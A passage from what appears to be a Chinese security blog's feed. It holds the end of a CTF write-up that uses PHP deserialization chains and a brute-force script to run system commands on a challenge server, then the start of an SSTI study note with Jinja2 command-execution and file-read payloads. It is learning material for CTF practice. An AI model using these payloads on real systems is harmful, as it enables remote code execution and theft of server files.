class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>但是只有</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122162120344.png" alt="image-20250122162120344"></p><p>应该是注释掉了，使用伪协议读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>解码后得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#用于check.php</span><br><br><span class="hljs-attribute">key</span>：qwertyuiopasdfghjklzxcvbnm123456789<br><br><span class="hljs-attribute">move</span>：<span class="hljs-number">2</span>~<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>但是不知道有什么用</p><p>尝试使用原生类扫目录试试</p><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h2><p><code>glob:///f*</code>，这是一个 PHP 的流包装器，用于匹配根目录下的所有f开头的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;glob:///f*&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;DirectoryIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>找到flag的文件是f1agaaa</p><p>使用伪协议读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=f1agaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>拿到flag</p><p>官方wp是flag文件是不知道的要结合给出的key和move去爆破</p><p>官方解释：</p><p>其中move是移动的意思，猜测这是一个移位的加密，其中猜测key是范围那么就有向左就有3种可能， 向右也有3种可能 但是提示2提示我们random-随机，那么加密可能是2~7随机，那么每次正好相等就是1&#x2F;24的几率</p><p>之后就想办法构造链子触发利用<code>eval</code>函数了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$a</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos -&gt;aaa = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cycycycy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;</span><br><br></code></pre></td></tr></table></figure><p>之后用脚本爆破key就可以了，贴一个官方的脚本 <strong>没懂</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>mi = [<span class="hljs-string">&#x27;i6xstx6d6x6ir&#x27;</span>,<span class="hljs-string">&#x27;u5zarz5s5z5ue&#x27;</span>,<span class="hljs-string">&#x27;y4lpel4a4l4yw&#x27;</span>,<span class="hljs-string">&#x27;sqnhonqjqnqsi&#x27;</span>,<span class="hljs-string">&#x27;dwmjpmwkwmwdo&#x27;</span>,<span class="hljs-string">&#x27;fe1ka1ele1efp&#x27;</span>]<br>d = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> d&lt;<span class="hljs-number">2</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> mi:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;eval&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;cat /f1agaaa&quot;);&#x27;</span><br>        &#125;<br>        url = <span class="hljs-string">f&quot;http://67423f19-3ba4-41b5-9e10-716ce8f5e683.challenge.ctf.show/index.php?get=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span><br>        header = &#123;<br>            <span class="hljs-string">&#x27;aaaaaa&#x27;</span>:<span class="hljs-string">&#x27;O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;&#x27;</span><br>        &#125;<br>        reqpose = requests.post(url=url,data=data,headers=header).text<br>        re_text = re.findall(<span class="hljs-string">r&quot;(?&lt;=&lt;/code&gt;).*&quot;</span>, reqpose, re.S)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> re_text:<br>            <span class="hljs-built_in">print</span>(re_text[<span class="hljs-number">0</span>])<br>            d += <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>php原生类</tag>
      
      <tag>flask加密伪造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模板注入</title>
    <link href="/tuyi/2025/01/19/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/tuyi/2025/01/19/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>一点关于ssti的学习笔记以 Djingo为例 当然不仅仅只有python的ssti 其他语言也有，甚至Rust都有</p><p>不会就试试<strong>fenjing一把梭哈</strong></p><h1 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>、任意命令执行<br>&#123;%<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="hljs-keyword">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br><span class="hljs-number">2</span>、任意命令执行<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br>//这个<span class="hljs-number">138</span>对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload<br><span class="hljs-number">3</span>、任意命令执行<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">4</span>、任意命令执行<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">5</span>、任意命令执行<br>&#123;&#123;config.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">6</span>、文件读取<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">7.</span>任意命令执行<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">8.</span>不出网写静态文件<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo cat /app/flag &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">9.</span>当config是<span class="hljs-literal">None</span>时，尝试读取current_app的config<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br><br></code></pre></td></tr></table></figure><h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><p>获取键值或下标的方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>获取属性的方式</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。<br>&#123;&#123;&#125;&#125;用于将表达式打印到模板输出<br>&#123;##&#125;表示未包含在模板输出中的注释<br>\##可以有和&#123;%%&#125;相同的效果<br></code></pre></td></tr></table></figure>{%set%}拼接<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">c.构造popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> c=dict(po=a,pen=a)|<span class="hljs-name">join</span>%&#125;</span><br></code></pre></td></tr></table></figure><h1 id="1-什么是SSTI模板注入"><a href="#1-什么是SSTI模板注入" class="headerlink" title="1.什么是SSTI模板注入"></a>1.什么是SSTI模板注入</h1><p>SSTI，服务端模板注入，其实也就是模板引擎+注入, 那么我们首先需要了解一下模板引擎</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。也就是html框架</p><p>常见的模板引擎：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">PHP:</span> Smarty, Twig, <span class="hljs-keyword">Blade</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java: </span><span class="hljs-keyword">JSP, </span>FreeMarker, Velocity<br><span class="hljs-symbol">Python:</span> <span class="hljs-keyword">Jinja2, </span>django, tornado<br></code></pre></td></tr></table></figure><p>简单的ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">  &lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="hljs-string">  &lt;/head&gt;</span><br><span class="hljs-string"> &lt;body&gt;</span><br><span class="hljs-string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span><br><span class="hljs-string">  &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>% (name)<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>当我们输入name是可控的,使用的是%S来实现动态的字符串控制，而Flask使用的是jinja2模板，我们可以传入{{}}，`{{}}`在`Jinja2`中作为变量包裹标识符，`Jinja2`在渲染的时候会把{{}}包裹的内容进行解析，就可以执行命令。<h1 id="2-SSTI前置知识"><a href="#2-SSTI前置知识" class="headerlink" title="2.SSTI前置知识"></a>2.SSTI前置知识</h1><p>主要了解一点Python的魔术方法和内置类</p><p><code>__class__</code>用于返回该对象所属的类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;abcd&#x27;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__base__</code>用于获取类的基类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__base__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br>//<span class="hljs-built_in">object</span>为<span class="hljs-built_in">str</span>的基类<br></code></pre></td></tr></table></figure><p><code>__mro__</code>返回解析方法调用的顺序的元组。（当调用_mro_[1]或者-1时作用其实等同于_base_）<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__subclasses__()</code>可以获取类的所有子类的元组<br>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;,&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;...]<br></code></pre></td></tr></table></figure><p><code>__init__</code><br>重载子类，获取子类初始化的属性。</p><p><code>__globals__</code><br>函数会以字典的形式返回当前位置的全部全局变量<br>就比如：<code>os._wrap_close.__init__.__globals__</code>，可以获取到os中的一些函数，进行文件读取</p><h1 id="3-SSTI语句构造"><a href="#3-SSTI语句构造" class="headerlink" title="3.SSTI语句构造"></a>3.SSTI语句构造</h1><p>第一步，拿到当前类，也就是用__class__</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br></code></pre></td></tr></table></figure><p>第二步，拿到基类，这里可以用__base__，也可以用__mro__</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[1]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>第三步，拿到基类的子类，用<code>__subclasses__()</code></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()&#125;&#125;<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, 